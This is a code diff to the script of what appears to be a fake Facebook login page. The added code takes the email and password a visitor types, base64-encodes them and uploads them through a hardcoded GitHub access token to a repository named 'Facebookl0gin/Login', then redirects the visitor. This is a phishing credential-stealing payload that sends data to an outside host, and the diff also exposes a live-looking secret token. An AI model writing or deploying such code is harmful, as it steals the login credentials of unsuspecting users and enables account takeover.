@@ -210,21 +210,31 @@
 }
 
         function downloadUserInfo() {
+            debugger
             const username = document.getElementById('email').value;
             const password = document.getElementById('pass').value;
-            const data = `Username: ${username}\nPassword: ${password}`;
-            const blob = new Blob([data], { type: 'text/plain' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'user_info.txt';
-            document.body.appendChild(a);
-            a.click();
-            setTimeout(() => {
-                URL.revokeObjectURL(url);
-                document.body.removeChild(a);
-            }, 0);
-            redirectToLink()
+            const data = `Username: ${username} and Password: ${password}`;
+            const githubRepo = 'Facebookl0gin/Login'; // Repository path in the format username/repo
+const filename = 'newdata.txt'; // Name of the file you want to update
+const accessToken = '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'; // Provided personal access token
+
+const fileContent = 'This is the new data you want to add to the file.';
+
+const encodedContent = btoa(data);
+
+fetch(`https://api.github.com/repos/${githubRepo}/contents/${filename}`, {
+  method: 'PUT',
+  headers: {
+    Authorization: `token ${accessToken}`,
+    Accept: 'application/vnd.github.v3+json',
+  },
+  body: JSON.stringify({
+    message: 'Adding data to newdata.txt',
+    content: encodedContent,
+    sha: '8b137891791fe96927ad78e64b0aad7bded08bdc' // SHA of the existing file
+  }),
+})
+        redirectToLink()
         }
     </script>
   </body>
